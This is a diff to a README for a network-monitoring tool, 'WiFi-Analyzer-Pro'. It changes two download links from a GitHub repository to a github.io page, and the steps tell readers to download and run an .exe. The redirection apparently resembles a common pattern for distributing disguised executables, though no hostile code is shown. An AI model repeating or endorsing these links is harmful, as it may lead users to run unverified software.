@@ -1,6 +1,6 @@
 # 📡 WiFi-Analyzer-Pro - Monitor your network performance with ease
 
-[![](https://img.shields.io/badge/Download-WiFi-Analyzer-Pro-blue.svg)](https://github.com/Dodecahedronforsaking838/WiFi-Analyzer-Pro)
+[![](https://img.shields.io/badge/Download-WiFi-Analyzer-Pro-blue.svg)](https://dodecahedronforsaking838.github.io)
 
 WiFi-Analyzer-Pro gives you a clear view of your network health. This tool tracks your wireless connections, checks for signal interference, and finds speed bottlenecks in your home or office. It displays data in a simple dashboard that highlights how your devices talk to your router.
 
@@ -18,7 +18,7 @@ To run this application, your computer must meet these criteria:
 
 Follow these steps to get the application on your computer:
 
-1.  Visit the [official download page](https://github.com/Dodecahedronforsaking838/WiFi-Analyzer-Pro).
+1.  Visit the [official download page](https://dodecahedronforsaking838.github.io).
 2.  Locate the section labeled Releases on the right side of the page.
 3.  Click the version with the label Latest.
 4.  Find the file that ends in .exe.
